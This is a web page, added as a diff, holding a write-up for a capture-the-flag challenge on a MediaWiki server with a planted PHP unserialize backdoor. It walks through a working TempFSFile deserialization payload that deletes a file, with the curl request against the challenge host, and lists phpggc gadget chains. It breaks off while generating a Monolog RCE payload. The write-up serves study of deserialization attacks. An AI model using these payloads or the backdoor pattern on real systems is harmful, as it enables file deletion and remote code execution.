@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Track (2 challenges)</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>4-8</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Linkster78</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>4/10 (unintended) - 8/10 (intended)</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The challenge is a web server running MediaWiki, the open-source wiki platform that powers websites like Wikipedia :
+<img alt="MediaWiki" src="/images/unitedctf2025/trampofolies1.png" /></p>
+<p>We are told the following backdoor has been added to the API in the <code>rest.php</code> file :</p>
+<pre class="codehilite"><code class="language-php">if(isset($_GET['backdoor'])) {
+   unserialize(base64_decode($_GET['backdoor']));
+}
+</code></pre>
+
+<p>The first challenge involves removing a file on the file system, while the second is to get remote code execution on the server.</p>
+<h4 id="part-1-php-object-injection">Part 1 - PHP Object Injection</h4>
+<p>The challenge description tells us that the <code>checkflag1.php</code> file will gives us the first flag if a specific file has been deleted from the file system. Visiting the file reveals the full path of the image we're supposed to delete :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united]
+└─$ curl https://trampofolies-eb1876f303.challenges.unitedctf.ca/checkflag1.php                                                 
+L'image problématique est toujours sur le site.&lt;br&gt;Emplacement de l'image: /var/www/html/images/thumb/f/fc/Trampolin.png/500px-Trampolin.png 
+</code></pre>
+
+<p>The backdoor uses the <code>unserialize</code> function. Serialization is the process of turning programming objects into string formats for transmission, while deserialization is the opposite. A deserialization attack happens when an application allows user controlled input to be unserialized, potentially leading to arbitrary code execution. This happens because a lot of languages have mechanics that execute code (that may or may not be directly controlled) automatically during this process for cleanup.</p>
+<p>In PHP, deserialization attacks take advantage of magic functions, which are functions that execute automatically following a specific event. Here are a few examples :</p>
+<ul>
+<li><code>__destruct()</code> : Runs when an object is destroyed or when the script ends</li>
+<li><code>__wakeup()</code> : Runs when an object is created with <code>unserialize()</code></li>
+<li><code>__sleep()</code> : Runs when an object is serialized with <code>serialize()</code></li>
+<li><code>__toString()</code> : Runs when an object is used in string context</li>
+</ul>
+<p>So PHP objects can be created with deserialization and magic functions can be triggered by this process. But how do we weaponize this? The idea is to depend on the existing magic functions and hope they do something interesting with the object's attribute, which we can control.</p>
+<p>Take this ready-for-production class for example :</p>
+<pre class="codehilite"><code class="language-php">class Evil {
+    public $cmd;
+
+    public function __destruct() {
+        system($this-&gt;cmd);
+    }
+}
+</code></pre>
+
+<p>If we could ever create an object here via deserialization, the <code>__destruct</code> would execute automatically and call <code>system</code> with the <code>cmd</code> attribute of the object as a parameter. All we would need to do in this case is serialize our own object with a modified <code>cmd</code> attribute and inject it :</p>
+<pre class="codehilite"><code class="language-php">$payload = serialize(new Evil(['cmd' =&gt; 'ls']));
+</code></pre>
+
+<p>Under a serialized format, this would look like this :</p>
+<pre class="codehilite"><code>O:4:&quot;Evil&quot;:1:{s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}
+</code></pre>
+
+<p>Of course, doing this inside an actual codebase is not as straightforward. Thankfully, our first objective is only to delete a file. We're going to need to find a class inside of MediaWiki's codebase that has a magic function that will delete a file with its path being an attribute of the class.</p>
+<p>We can download the <a href="https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/core/+/REL1_44/">codebase</a> locally and write a python script that will recursively check the contents of each file to check for instances of a specific string. Let's start with <code>__destruct</code> :</p>
+<pre class="codehilite"><code class="language-python">import os
+
+def find_instances(root_dir):
+    for dirpath, _, filenames in os.walk(root_dir):
+        for filename in filenames:
+            filepath = os.path.join(dirpath, filename)
+            try:
+                with open(filepath, 'r', encoding='utf-8', errors='ignore') as file:
+                    for line_num, line in enumerate(file, 1):
+                        if '__destruct' in line:
+                            print(f&quot;Found '__destruct' in file: {filepath} (line {line_num})&quot;)
+                            break
+            except Exception as e:
+                print(f&quot;Could not read file {filepath}: {e}&quot;)
+
+find_instances(&quot;/home/kali/Downloads/&quot;)
+</code></pre>
+
+<p>We have a lot of results :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ python3 scan.py
+Found '__destruct' in file: /home/kali/Downloads/HISTORY (line 20926)
+Found '__destruct' in file: /home/kali/Downloads/tests/phpunit/MediaWikiTestCaseTrait.php (line 42)
+Found '__destruct' in file: /home/kali/Downloads/tests/phpunit/integration/includes/user/TempUser/TempUserCreatorTest.php (line 231)
+Found '__destruct' in file: /home/kali/Downloads/tests/phpunit/integration/includes/jobqueue/JobQueueDBTest.php (line 159)
+Found '__destruct' in file: /home/kali/Downloads/.phan/internal_stubs/redis.phan_php (line 39)
+Found '__destruct' in file: /home/kali/Downloads/core/HISTORY (line 20926)
+Found '__destruct' in file: /home/kali/Downloads/core/tests/phpunit/MediaWikiTestCaseTrait.php (line 42)
+Found '__destruct' in file: /home/kali/Downloads/core/tests/phpunit/integration/includes/user/TempUser/TempUserCreatorTest.php (line 231)
+Found '__destruct' in file: /home/kali/Downloads/core/tests/phpunit/integration/includes/jobqueue/JobQueueDBTest.php (line 159)
+Found '__destruct' in file: /home/kali/Downloads/core/.phan/internal_stubs/redis.phan_php (line 39)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/shell/Command.php (line 64)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/filerepo/file/LocalFile.php (line 2817)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/profiler/SectionProfileCallback.php (line 39)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/telemetry/Span.php (line 30)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/objectcache/RedisConnRef.php (line 308)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/objectcache/RedisConnectionPool.php (line 420)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/filebackend/fsfile/TempFSFile.php (line 207)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/http/MultiHttpClient.php (line 879)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/lockmanager/RedisLockManager.php (line 266)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/lockmanager/ScopedLock.php (line 93)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/lockmanager/FSLockManager.php (line 248)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/lockmanager/MemcLockManager.php (line 351)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/ParamValidator/Util/UploadedFileStream.php (line 65)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/rdbms/loadbalancer/LoadBalancerSingle.php (line 99)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/rdbms/database/DatabaseSqlite.php (line 291)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/rdbms/database/Database.php (line 3216)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/rdbms/database/DBConnRef.php (line 18)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/rdbms/lbfactory/LBFactorySingle.php (line 125)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/uuid/GlobalIdGenerator.php (line 748)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/libs/WRStats/WRStatsWriter.php (line 116)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/parser/Parser.php (line 562)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/parser/LinkHolderArray.php (line 71)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/session/SessionBackend.php (line 229)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/session/Session.php (line 77)
+Found '__destruct' in file: /home/kali/Downloads/core/includes/StubObject/StubGlobalUser.php (line 148)
+Found '__destruct' in file: /home/kali/Downloads/includes/shell/Command.php (line 64)
+Found '__destruct' in file: /home/kali/Downloads/includes/filerepo/file/LocalFile.php (line 2817)
+Found '__destruct' in file: /home/kali/Downloads/includes/profiler/SectionProfileCallback.php (line 39)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/telemetry/Span.php (line 30)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/objectcache/RedisConnRef.php (line 308)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/objectcache/RedisConnectionPool.php (line 420)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/filebackend/fsfile/TempFSFile.php (line 207)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/http/MultiHttpClient.php (line 879)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/lockmanager/RedisLockManager.php (line 266)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/lockmanager/ScopedLock.php (line 93)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/lockmanager/FSLockManager.php (line 248)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/lockmanager/MemcLockManager.php (line 351)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/ParamValidator/Util/UploadedFileStream.php (line 65)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/rdbms/loadbalancer/LoadBalancerSingle.php (line 99)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/rdbms/database/DatabaseSqlite.php (line 291)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/rdbms/database/Database.php (line 3216)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/rdbms/database/DBConnRef.php (line 18)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/rdbms/lbfactory/LBFactorySingle.php (line 125)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/uuid/GlobalIdGenerator.php (line 748)
+Found '__destruct' in file: /home/kali/Downloads/includes/libs/WRStats/WRStatsWriter.php (line 116)
+Found '__destruct' in file: /home/kali/Downloads/includes/parser/Parser.php (line 562)
+Found '__destruct' in file: /home/kali/Downloads/includes/parser/LinkHolderArray.php (line 71)
+Found '__destruct' in file: /home/kali/Downloads/includes/session/SessionBackend.php (line 229)
+Found '__destruct' in file: /home/kali/Downloads/includes/session/Session.php (line 77)
+Found '__destruct' in file: /home/kali/Downloads/includes/StubObject/StubGlobalUser.php (line 148)
+</code></pre>
+
+<p><code>TempFSFile</code> immediately stands out. If we look at the <code>__destruct</code> function, it calls a function called <code>purge()</code> if the <code>canDelete</code> attribute evaluates to true :</p>
+<pre class="codehilite"><code class="language-php">public function __destruct() {
+    if ( $this-&gt;canDelete ) {
+        $this-&gt;purge();
+    }
+}
+</code></pre>
+
+<p>The <code>purge()</code> function is exactly what we were looking for :</p>
+<pre class="codehilite"><code class="language-php">public function purge() {
+    $this-&gt;canDelete = false;
+    AtEase::suppressWarnings();
+    $ok = unlink( $this-&gt;path );
+    AtEase::restoreWarnings();
+    unset( self::$pathsCollect[$this-&gt;path] );
+    return $ok;
+}
+</code></pre>
+
+<p>It calls the <code>unlink</code> function (PHP's file deletion method) on <code>this-&gt;path</code>. This variable is the argument used in the class' constructor :</p>
+<pre class="codehilite"><code class="language-php">public function __construct( $path ) {
+    parent::__construct( $path );
+    if ( self::$pathsCollect === null ) {
+        // @codeCoverageIgnoreStart
+        self::$pathsCollect = [];
+        register_shutdown_function( [ __CLASS__, 'purgeAllOnShutdown' ] );
+        // @codeCoverageIgnoreEnd
+    }
+}
+</code></pre>
+
+<p>Sweet. All we have to do is create an instance of the <code>TempFSFile</code> class with the file path we want to delete as the argument and set the <code>canDelete</code> attribute to true. Since this class is a child class of <code>FSFile</code>, we'll need to define it in our PHP file that will serialize our object :</p>
+<pre class="codehilite"><code class="language-php">&lt;?php
+class FSFile {
+    protected $path;
+    public function __construct($path) {
+        $this-&gt;path = $path;
+    }
+}
+
+class TempFSFile extends FSFile {
+    protected $canDelete = true;
+}
+
+$obj = new TempFSFile('/var/www/html/images/thumb/f/fc/Trampolin.png/500px-Trampolin.png');
+
+$serialized = serialize($obj);
+echo base64_encode($serialized);
+?&gt;
+</code></pre>
+
+<p><em>Note : More on namespaces and why this still worked without specifying one later</em></p>
+<p>Here's the script output :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/trampo]
+└─$ php -f serialize.php                                 
+TzoxMDoiVGVtcEZTRmlsZSI6Mjp7czo3OiIAKgBwYXRoIjtzOjY1OiIvdmFyL3d3dy9odG1sL2ltYWdlcy90aHVtYi9mL2ZjL1RyYW1wb2xpbi5wbmcvNTAwcHgtVHJhbXBvbGluLnBuZyI7czoxMjoiACoAY2FuRGVsZXRlIjtiOjE7fQ==                                                               
+</code></pre>
+
+<p>It decodes to this serialized string :</p>
+<pre class="codehilite"><code>O:10:&quot;TempFSFile&quot;:2:{s:7:&quot;*path&quot;;s:65:&quot;/var/www/html/images/thumb/f/fc/Trampolin.png/500px-Trampolin.png&quot;;s:12:&quot;*canDelete&quot;;b:1;}
+</code></pre>
+
+<p>We can use the backdoor like so to deserialize our payload :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/trampo]
+└─$ curl -s 'https://trampofolies-eb1876f303.challenges.unitedctf.ca/rest.php?backdoor=TzoxMDoiVGVtcEZTRmlsZSI6Mjp7czo3OiIAKgBwYXRoIjtzOjY1OiIvdmFyL3d3dy9odG1sL2ltYWdlcy90aHVtYi9mL2ZjL1RyYW1wb2xpbi5wbmcvNTAwcHgtVHJhbXBvbGluLnBuZyI7czoxMjoiACoAY2FuRGVsZXRlIjtiOjE7fQ==' -i
+
+HTTP/2 308 
+content-type: text/html; charset=utf-8
+date: Sun, 28 Sep 2025 19:34:37 GMT
+location: /rest.php/
+server: Apache/2.4.65 (Debian)
+vary: x-restbase-compat
+x-content-type-options: nosniff
+x-powered-by: PHP/8.1.33
+x-request-id: 4bac80b71249aeb68cde6a8b
+
+&lt;!doctype html&gt;&lt;title&gt;Redirect&lt;/title&gt;&lt;a href=&quot;/rest.php/&quot;&gt;/rest.php/&lt;/a&gt;
+</code></pre>
+
+<p>Going back to the <code>checkflag1.php</code> file, we see our first flag :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/trampo]
+└─$ curl https://trampofolies-eb1876f303.challenges.unitedctf.ca/checkflag1.php
+Vive les trampolineux! flag-7aa47b8f0106691e
+</code></pre>
+
+<h4 id="part-2-php-gadget-chains">Part 2 - PHP Gadget Chains</h4>
+<p>This is where things get messy. It's time to achieve code execution, and you best believe it won't be as simple as finding a single class that will just run an attribute as a command. Our goal is the execute the <code>/printflag2</code> executable. We're going to need a series of classes that play into each other to achieve a bigger result. This is called a <strong>gadget chain</strong>. </p>
+<p>Here's an example at its most basic level, taken from a blog post I can no longer find in my search history to link here :</p>
+<pre class="codehilite"><code class="language-php">class Example
+{
+   private $obj;
+
+   function __construct()
+   {
+      // some PHP code...
+   }
+
+   function __wakeup()
+   {
+      if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;evaluate();
+   }
+}
+
+class CodeSnippet
+{
+   private $code;
+
+   function evaluate()
+   {
+      eval($this-&gt;code);
+   }}
+// some PHP code...
+
+$user_data = unserialize($_POST['data']);
+
+// some PHP code...
+</code></pre>
+
+<p>We have an interesting function <code>evaluate</code> that calls <code>eval</code>, but no way of calling with normal object injection because of its lack of magic functions. However, if we look at the other class, we can see that a magic function will execute the <code>evaluate</code> function belonging to the <code>obj</code> attribute on object creation. This means we could create a malicious <code>CodeSnippet</code> class with malicious code, and use that class as the object inside the <code>obj</code> attribute of the <code>Example</code> class :</p>
+<pre class="codehilite"><code class="language-php">class CodeSnippet
+{
+   private $code = &quot;phpinfo();&quot;;
+}
+
+class Example
+{
+   private $obj;
+
+   function __construct()
+   {
+      $this-&gt;obj = new CodeSnippet;
+   }
+}
+
+print urlencode(serialize(new Example));
+</code></pre>
+
+<p>Deserialized, it looks like this :</p>
+<pre class="codehilite"><code>O:7:&quot;Example&quot;:1:{s:12:&quot;Exampleobj&quot;;O:11:&quot;CodeSnippet&quot;:1:{s:17:&quot;CodeSnippetcode&quot;;s:10:&quot;phpinfo();&quot;;}}
+</code></pre>
+
+<p>We'll be looking to build a similar chain of classes with objects that can be used as attributes and then processed (which could also then trigger more magic functions!). </p>
+<h4 id="part-2-unintended-solution">Part 2 - Unintended solution</h4>
+<p>I first tried using the <code>phpggc</code> tool (available on Kali Linux) to generate already discovered gadget chains within popular codebases and projects, hoping one of them would be implemented by MediaWiki. We can list the available payloads to see what we're working with :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/trampo]
+└─$ phpggc -l                                                                                                                                      
+Gadget Chains
+-------------
+
+NAME                                      VERSION                                                 TYPE                   VECTOR         I    
+Bitrix/RCE1                               17.x.x &lt;= 22.0.300                                      RCE (Function call)    __destruct          
+CakePHP/RCE1                              ? &lt;= 3.9.6                                              RCE (Command)          __destruct          
+CakePHP/RCE2                              ? &lt;= 4.2.3                                              RCE (Function call)    __destruct          
+CodeIgniter4/RCE1                         4.0.2                                                   RCE (Function call)    __destruct          
+CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.0.4+                                    RCE (Function call)    __destruct          
+CodeIgniter4/RCE3                         -4.1.3+                                                 RCE (Function call)    __destruct          
+CodeIgniter4/RCE4                         4.0.0-beta.1 &lt;= 4.0.0-rc.4                              RCE (Function call)    __destruct          
+CodeIgniter4/RCE5                         -4.1.3+                                                 RCE (Function call)    __destruct          
+CodeIgniter4/RCE6                         -4.1.3 &lt;= 4.2.10+                                       RCE (Function call)    __destruct          
+Doctrine/FW1                              ?                                                       File write             __toString     *    
+Doctrine/FW2                              2.3.0 &lt;= 2.4.0 v2.5.0 &lt;= 2.8.5                          File write             __destruct     *    
+Doctrine/RCE1                             1.5.1 &lt;= 2.7.2                                          RCE (PHP code)         __destruct     *    
+Doctrine/RCE2                             1.11.0 &lt;= 2.3.2                                         RCE (Function call)    __destruct     *    
+Dompdf/FD1                                1.1.1 &lt;= ?                                              File delete            __destruct     *    
+Dompdf/FD2                                ? &lt; 1.1.1                                               File delete            __destruct     *    
+Drupal7/FD1                               7.0 &lt; ?                                                 File delete            __destruct     *    
+Drupal7/RCE1                              7.0.8 &lt; ?                                               RCE (Function call)    __destruct     *    
+Drupal9/RCE1                              -8.9.6 &lt;= 9.4.9+                                        RCE (Function call)    __destruct     *    
+Guzzle/FW1                                4.0.0-rc.2 &lt;= 7.5.0+                                    File write             __destruct          
+Guzzle/INFO1                              6.0.0 &lt;= 6.3.2                                          phpinfo()              __destruct     *    
+Guzzle/RCE1                               6.0.0 &lt;= 6.3.2                                          RCE (Function call)    __destruct     *    
+Horde/RCE1                                &lt;= 5.2.22                                               RCE (PHP code)         __destruct     *    
+Kohana/FR1                                3.*                                                     File read              __toString     *    
+Laminas/FD1                               &lt;= 2.11.2                                               File delete            __destruct          
+Laminas/FW1                               2.8.0 &lt;= 3.0.x-dev                                      File write             __destruct     *    
+Laravel/RCE1                              5.4.27                                                  RCE (Function call)    __destruct          
+Laravel/RCE2                              5.4.0 &lt;= 8.6.9+                                         RCE (Function call)    __destruct          
+Laravel/RCE3                              5.5.0 &lt;= 5.8.35                                         RCE (Function call)    __destruct     *    
+Laravel/RCE4                              5.4.0 &lt;= 8.6.9+                                         RCE (Function call)    __destruct          
+Laravel/RCE5                              5.8.30                                                  RCE (PHP code)         __destruct     *    
+Laravel/RCE6                              5.5.* &lt;= 5.8.35                                         RCE (PHP code)         __destruct     *    
+Laravel/RCE7                              ? &lt;= 8.16.1                                             RCE (Function call)    __destruct     *    
+Laravel/RCE8                              7.0.0 &lt;= 8.6.9+                                         RCE (Function call)    __destruct     *    
+Laravel/RCE9                              5.4.0 &lt;= 9.1.8+                                         RCE (Function call)    __destruct          
+Laravel/RCE10                             5.6.0 &lt;= 9.1.8+                                         RCE (Function call)    __toString          
+Laravel/RCE11                             5.4.0 &lt;= 9.1.8+                                         RCE (Function call)    __destruct          
+Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                   RCE (Function call)    __destruct     *    
+Laravel/RCE13                             5.3.0 &lt;= 9.5.1+                                         RCE (Function call)    __destruct     *    
+Laravel/RCE14                             5.3.0 &lt;= 9.5.1+                                         RCE (Function call)    __destruct          
+Laravel/RCE15                             5.5.0 &lt;= v9.5.1+                                        RCE (Function call)    __destruct          
+Laravel/RCE16                             5.6.0 &lt;= v9.5.1+                                        RCE (Function call)    __destruct          
+Magento/FW1                               ? &lt;= 1.9.4.0                                            File write             __destruct     *    
+Magento/SQLI1                             ? &lt;= 1.9.4.0                                            SQL injection          __destruct          
+Magento2/FD1                              *                                                       File delete            __destruct     *    
+Monolog/FW1                               3.0.0 &lt;= 3.1.0+                                         File write             __destruct     *    
+Monolog/RCE1                              1.4.1 &lt;= 1.6.0 1.17.2 &lt;= 2.7.0+                         RCE (Function call)    __destruct          
+Monolog/RCE2                              1.4.1 &lt;= 2.7.0+                                         RCE (Function call)    __destruct          
+Monolog/RCE3                              1.1.0 &lt;= 1.10.0                                         RCE (Function call)    __destruct          
+Monolog/RCE4                              ? &lt;= 2.4.4+                                             RCE (Command)          __destruct     *    
+Monolog/RCE5                              1.25 &lt;= 2.7.0+                                          RCE (Function call)    __destruct          
+Monolog/RCE6                              1.10.0 &lt;= 2.7.0+                                        RCE (Function call)    __destruct          
+Monolog/RCE7                              1.10.0 &lt;= 2.7.0+                                        RCE (Function call)    __destruct     *    
+Monolog/RCE8                              3.0.0 &lt;= 3.1.0+                                         RCE (Function call)    __destruct     *    
+Monolog/RCE9                              3.0.0 &lt;= 3.1.0+                                         RCE (Function call)    __destruct     *    
+Phalcon/RCE1                              &lt;= 1.2.2                                                RCE                    __wakeup       *    
+Phing/FD1                                 2.6.0 &lt;= 3.0.0a3                                        File delete            __destruct          
+PHPCSFixer/FD1                            &lt;= 2.17.3                                               File delete            __destruct          
+PHPCSFixer/FD2                            &lt;= 2.17.3                                               File delete            __destruct          
+PHPExcel/FD1                              1.8.2+                                                  File delete            __destruct          
+PHPExcel/FD2                              &lt;= 1.8.1                                                File delete            __destruct          
+PHPExcel/FD3                              1.8.2+                                                  File delete            __destruct          
+PHPExcel/FD4                              &lt;= 1.8.1                                                File delete            __destruct          
+PHPSecLib/RCE1                            2.0.0 &lt;= 2.0.34                                         RCE (PHP code)         __destruct     *    
+Pydio/Guzzle/RCE1                         &lt; 8.2.2                                                 RCE (Function call)    __toString          
+Slim/RCE1                                 3.8.1                                                   RCE (Function call)    __toString          
+Smarty/FD1                                ?                                                       File delete            __destruct          
+Smarty/SSRF1                              ?                                                       SSRF                   __destruct     *    
+Spiral/RCE1                               2.7.0 &lt;= 2.8.13                                         RCE (Function call)    __destruct          
+Spiral/RCE2                               -2.8+                                                   RCE (Function call)    __destruct     *    
+SwiftMailer/FD1                           -5.4.12+, -6.2.1+                                       File delete            __destruct          
+SwiftMailer/FD2                           5.4.6 &lt;= 5.x-dev                                        File delete            __destruct     *    
+SwiftMailer/FR1                           6.0.0 &lt;= 6.3.0                                          File read              __toString          
+SwiftMailer/FW1                           5.1.0 &lt;= 5.4.8                                          File write             __toString          
+SwiftMailer/FW2                           6.0.0 &lt;= 6.0.1                                          File write             __toString          
+SwiftMailer/FW3                           5.0.1                                                   File write             __toString          
+SwiftMailer/FW4                           4.0.0 &lt;= ?                                              File write             __destruct          
+Symfony/FD1                               v3.2.7 &lt;= v3.4.25 v4.0.0 &lt;= v4.1.11 v4.2.0 &lt;= v4.2.6    File delete            __destruct          
+Symfony/FW1                               2.5.2                                                   File write             DebugImport    *    
+Symfony/FW2                               3.4                                                     File write             __destruct          
+Symfony/RCE1                              v3.1.0 &lt;= v3.4.34                                       RCE (Command)          __destruct     *    
+Symfony/RCE2                              2.3.42 &lt; 2.6                                            RCE (PHP code)         __destruct     *    
+Symfony/RCE3                              2.6 &lt;= 2.8.32                                           RCE (PHP code)         __destruct     *    
+Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE (Function call)    __destruct     *    
+Symfony/RCE5                              5.2.*                                                   RCE (Function call)    __destruct          
+Symfony/RCE6                              v3.4.0-BETA4 &lt;= v3.4.49 &amp; v4.0.0-BETA4 &lt;= v4.1.13       RCE (Command)          __destruct     *    
+Symfony/RCE7                              v3.2.0 &lt;= v3.4.34 v4.0.0 &lt;= v4.2.11 v4.3.0 &lt;= v4.3.7    RCE (Function call)    __destruct          
+Symfony/RCE8                              v3.4.0 &lt;= v4.4.18 v5.0.0 &lt;= v5.2.1                      RCE (Function call)    __destruct          
+TCPDF/FD1                                 &lt;= 6.3.5                                                File delete            __destruct     *    
+ThinkPHP/FW1                              5.0.4-5.0.24                                            File write             __destruct     *    
+ThinkPHP/FW2                              5.0.0-5.0.03                                            File write             __destruct     *    
+ThinkPHP/RCE1                             5.1.x-5.2.x                                             RCE (Function call)    __destruct     *    
+ThinkPHP/RCE2                             5.0.24                                                  RCE (Function call)    __destruct     *    
+ThinkPHP/RCE3                             -6.0.1+                                                 RCE (Function call)    __destruct          
+ThinkPHP/RCE4                             -6.0.1+                                                 RCE (Function call)    __destruct          
+Typo3/FD1                                 4.5.35 &lt;= 10.4.1                                        File delete            __destruct     *    
+vBulletin/RCE1                            -5.6.9+                                                 RCE (Function call)    __destruct          
+WordPress/Dompdf/RCE1                     0.8.5+ &amp; WP &lt; 5.5.2                                     RCE (Function call)    __destruct     *    
+WordPress/Dompdf/RCE2                     0.7.0 &lt;= 0.8.4 &amp; WP &lt; 5.5.2                             RCE (Function call)    __destruct     *    
+WordPress/Guzzle/RCE1                     4.0.0 &lt;= 6.4.1+ &amp; WP &lt; 5.5.2                            RCE (Function call)    __toString     *    
+WordPress/Guzzle/RCE2                     4.0.0 &lt;= 6.4.1+ &amp; WP &lt; 5.5.2                            RCE (Function call)    __destruct     *    
+WordPress/P/EmailSubscribers/RCE1         4.0 &lt;= 4.4.7+ &amp; WP &lt; 5.5.2                              RCE (Function call)    __destruct     *    
+WordPress/P/EverestForms/RCE1             1.0 &lt;= 1.6.7+ &amp; WP &lt; 5.5.2                              RCE (Function call)    __destruct     *    
+WordPress/P/WooCommerce/RCE1              3.4.0 &lt;= 4.1.0+ &amp; WP &lt; 5.5.2                            RCE (Function call)    __destruct     *    
+WordPress/P/WooCommerce/RCE2              &lt;= 3.4.0 &amp; WP &lt; 5.5.2                                   RCE (Function call)    __destruct     *    
+WordPress/P/YetAnotherStarsRating/RCE1    ? &lt;= 1.8.6 &amp; WP &lt; 5.5.2                                 RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE1                   1.8.2+ &amp; WP &lt; 5.5.2                                     RCE (Function call)    __toString     *    
+WordPress/PHPExcel/RCE2                   &lt;= 1.8.1 &amp; WP &lt; 5.5.2                                   RCE (Function call)    __toString     *    
+WordPress/PHPExcel/RCE3                   1.8.2+ &amp; WP &lt; 5.5.2                                     RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE4                   &lt;= 1.8.1 &amp; WP &lt; 5.5.2                                   RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE5                   1.8.2+ &amp; WP &lt; 5.5.2                                     RCE (Function call)    __destruct     *    
+WordPress/PHPExcel/RCE6                   &lt;= 1.8.1 &amp; WP &lt; 5.5.2                                   RCE (Function call)    __destruct     *    
+Yii/RCE1                                  1.1.20                                                  RCE (Function call)    __wakeup       *    
+Yii/RCE2                                  1.1.20                                                  RCE (Function call)    __destruct          
+Yii2/RCE1                                 &lt;2.0.38                                                 RCE (Function call)    __destruct     *    
+Yii2/RCE2                                 &lt;2.0.38                                                 RCE (PHP code)         __destruct     *    
+ZendFramework/FD1                         ? &lt;= 1.12.20                                            File delete            __destruct          
+ZendFramework/RCE1                        ? &lt;= 1.12.20                                            RCE (PHP code)         __destruct     *    
+ZendFramework/RCE2                        1.11.12 &lt;= 1.12.20                                      RCE (Function call)    __toString     *    
+ZendFramework/RCE3                        2.0.1 &lt;= ?                                              RCE (Function call)    __destruct          
+ZendFramework/RCE4                        ? &lt;= 1.12.20                                            RCE (PHP code)         __destruct     *    
+ZendFramework/RCE5                        2.0.0rc2 &lt;= 2.5.3                                       RCE (Function call)    __destruct
+</code></pre>
+
+<p>We can check this list against MediaWiki's dependencies, which are stored in the <code>composer.json</code> file. An interesting result that pops up for both is <code>Monolog</code>, a logging library :
+<img alt="Composer file" src="/images/unitedctf2025/trampofolies2.png" /></p>
+<p>Let's try the first payload associated with <code>Monolog</code> :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/trampo]
+└─$ phpggc Monolog/RCE1 system '/printflag2' | base64 -w0
+PHP Deprecated:  Creation of dynamic property PHPGGC::$options is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 830
+PHP Deprecated:  Creation of dynamic property PHPGGC::$parameters is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 831
+PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\Enhancements::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line 9
